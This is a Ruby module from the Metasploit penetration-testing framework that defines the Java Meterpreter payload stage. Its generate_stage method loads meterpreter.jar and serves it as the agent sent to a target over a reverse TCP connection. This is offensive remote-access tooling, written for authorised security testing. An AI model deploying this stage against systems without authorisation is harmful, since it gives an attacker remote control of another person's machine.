##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/meterpreter_java'
require 'msf/base/sessions/meterpreter_options'


module Metasploit3
	include Msf::Sessions::MeterpreterOptions

	def initialize(info = {})
		super(update_info(info,
			'Name'          => 'Java Meterpreter',
			'Version'       => '$Revision$',
			'Description'   => 'Run a meterpreter server in Java',
			'Author'        => [
					'mihi', # all the hard work
					'egypt' # msf integration
				],
			'Platform'      => 'java',
			'Arch'          => ARCH_JAVA,
			'License'       => MSF_LICENSE,
			'Session'       => Msf::Sessions::Meterpreter_Java_Java))
	end

	def generate_stage
		file = File.join(Msf::Config.data_directory, "meterpreter", "meterpreter.jar")
		met = File.open(file, "rb") {|f|
			f.read(f.stat.size)
		}
		met
	end
end

